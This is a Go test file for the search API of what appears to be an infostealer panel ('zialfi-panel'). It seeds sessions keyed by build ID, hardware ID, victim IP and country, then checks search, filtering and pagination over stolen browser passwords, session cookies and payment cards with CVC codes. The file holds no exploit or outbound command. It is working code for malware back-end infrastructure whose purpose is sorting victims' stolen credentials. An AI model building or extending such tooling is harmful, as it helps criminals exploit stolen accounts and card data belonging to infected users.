package api_test

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/google/uuid"
	"zialfi-panel/internal/testutil"
)

func TestSearch_PasswordMatch(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
	if err != nil {
		t.Fatal(err)
	}

	pid := uuid.New().String()
	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES ($1, $2, 'google.com', 'john', 'secret', 'chrome')`, pid, sid)
	if err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		q            string
		matchedField string
	}{
		{"google", "url"},
		{"john", "username"},
		{"secret", "password_value"},
	}

	for _, cc := range cases {
		t.Run(cc.q, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/api/search?q="+cc.q, nil)
			req.Header.Set("Authorization", "Bearer "+token)
			w := httptest.NewRecorder()
			r.ServeHTTP(w, req)

			if w.Code != http.StatusOK {
				t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
			}

			var resp map[string]any
			if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
				t.Fatal(err)
			}

			results := resp["results"].([]any)
			if len(results) != 1 {
				t.Fatalf("expected 1 result, got %d", len(results))
			}

			r0 := results[0].(map[string]any)
			if r0["type"] != "password" {
				t.Errorf("expected type=password, got %v", r0["type"])
			}
			if r0["session_id"] != sid {
				t.Errorf("expected session_id=%s, got %v", sid, r0["session_id"])
			}
		})
	}
}

func TestSearch_CookieMatch(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
	if err != nil {
		t.Fatal(err)
	}

	cid := uuid.New().String()
	_, err = d.Exec(`INSERT INTO cookies (id, session_id, domain, name, value, path)
		VALUES ($1, $2, '.google.com', 'session', 'abc123', '/')`, cid, sid)
	if err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		q string
	}{
		{"google"},
		{"session"},
	}

	for _, cc := range cases {
		t.Run(cc.q, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/api/search?q="+cc.q, nil)
			req.Header.Set("Authorization", "Bearer "+token)
			w := httptest.NewRecorder()
			r.ServeHTTP(w, req)

			if w.Code != http.StatusOK {
				t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
			}

			var resp map[string]any
			if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
				t.Fatal(err)
			}

			results := resp["results"].([]any)
			if len(results) != 1 {
				t.Fatalf("expected 1 result, got %d", len(results))
			}

			r0 := results[0].(map[string]any)
			if r0["type"] != "cookie" {
				t.Errorf("expected type=cookie, got %v", r0["type"])
			}
		})
	}
}

func TestSearch_CardMatch(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
	if err != nil {
		t.Fatal(err)
	}

	cid := uuid.New().String()
	_, err = d.Exec(`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder, cvc)
		VALUES ($1, $2, '4111111111111111', '12', '28', 'John', '123')`, cid, sid)
	if err != nil {
		t.Fatal(err)
	}

	for _, q := range []string{"John", "4111"} {
		t.Run(q, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/api/search?q="+q, nil)
			req.Header.Set("Authorization", "Bearer "+token)
			w := httptest.NewRecorder()
			r.ServeHTTP(w, req)

			if w.Code != http.StatusOK {
				t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
			}

			var resp map[string]any
			if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
				t.Fatal(err)
			}

			results := resp["results"].([]any)
			t.Logf("q=%s results=%d body=%s", q, len(results), w.Body.String())
			if len(results) < 1 {
				t.Fatalf("expected 1 result, got %d", len(results))
			}

			r0 := results[0].(map[string]any)
			if r0["type"] != "card" {
				t.Errorf("expected type=card, got %v", r0["type"])
			}
		})
	}
}

func TestSearch_TypeFilter(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES ($1, $2, 'domain.com', 'user', 'pass', 'chrome')`, uuid.New().String(), sid)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO cookies (id, session_id, domain, name, value, path)
		VALUES ($1, $2, 'domain.com', 'sid', 'abc', '/')`, uuid.New().String(), sid)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("filter passwords", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/search?q=domain&type=password", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		var resp map[string]any
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatal(err)
		}
		results := resp["results"].([]any)
		if len(results) != 1 {
			t.Fatalf("expected 1 result, got %d", len(results))
		}
		if results[0].(map[string]any)["type"] != "password" {
			t.Errorf("expected type=password, got %v", results[0].(map[string]any)["type"])
		}
	})

	t.Run("filter cookies", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/search?q=domain&type=cookie", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		var resp map[string]any
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatal(err)
		}
		results := resp["results"].([]any)
		if len(results) != 1 {
			t.Fatalf("expected 1 result, got %d", len(results))
		}
		if results[0].(map[string]any)["type"] != "cookie" {
			t.Errorf("expected type=cookie, got %v", results[0].(map[string]any)["type"])
		}
	})
}

func TestSearch_MultiMatch(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
	if err != nil {
		t.Fatal(err)
	}

	for i := 0; i < 2; i++ {
		url := "test.com"
		if i == 1 {
			url = "test.org"
		}
		_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
			VALUES ($1, $2, $3, 'testuser', 'testpass', 'chrome')`,
			uuid.New().String(), sid, url)
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/search?q=test", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	results := resp["results"].([]any)
	if len(results) != 2 {
		t.Errorf("expected 2 results, got %d", len(results))
	}
}

func TestSearch_ShortQuery(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/search?q=a", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	results := resp["results"].([]any)
	if len(results) != 0 {
		t.Errorf("expected 0 results, got %d", len(results))
	}
	if resp["total"].(float64) != 0 {
		t.Errorf("expected total=0, got %v", resp["total"])
	}
}

func TestSearch_NoMatch(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/search?q=zzznotfound", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	results := resp["results"].([]any)
	if len(results) != 0 {
		t.Errorf("expected 0 results, got %d", len(results))
	}
	if resp["total"].(float64) != 0 {
		t.Errorf("expected total=0, got %v", resp["total"])
	}
}

func TestSearch_Pagination(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
	if err != nil {
		t.Fatal(err)
	}

	for i := 0; i < 3; i++ {
		_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
			VALUES ($1, $2, 'test.com', 'user', 'pass', 'chrome')`,
			uuid.New().String(), sid)
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/search?q=test&per_page=1&page=1", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	results := resp["results"].([]any)
	if len(results) != 1 {
		t.Errorf("expected 1 result, got %d", len(results))
	}
	if resp["total"].(float64) != 3 {
		t.Errorf("expected total=3, got %v", resp["total"])
	}
	if resp["page"].(float64) != 1 {
		t.Errorf("expected page=1, got %v", resp["page"])
	}
	if resp["perPage"].(float64) != 1 {
		t.Errorf("expected perPage=1, got %v", resp["perPage"])
	}
}

func TestSearch_EmptyQuery(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/search", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	results := resp["results"].([]any)
	if len(results) != 0 {
		t.Errorf("expected 0 results, got %d", len(results))
	}
	if resp["total"].(float64) != 0 {
		t.Errorf("expected total=0, got %v", resp["total"])
	}
}

func TestSearch_CrossSession(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid1 := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid1)
	if err != nil {
		t.Fatal(err)
	}

	sid2 := uuid.New().String()
	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ($1, 'b1', 'hw2', 'win11', 'user2', '5.6.7.8', 'GB', CURRENT_TIMESTAMP)`, sid2)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES ($1, $2, 'google.com', 'alice', 'pass1', 'chrome')`, uuid.New().String(), sid1)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES ($1, $2, 'google.com', 'bob', 'pass2', 'firefox')`, uuid.New().String(), sid2)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/search?q=google", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	results := resp["results"].([]any)
	if len(results) != 2 {
		t.Errorf("expected 2 results (both sessions), got %d", len(results))
	}
}
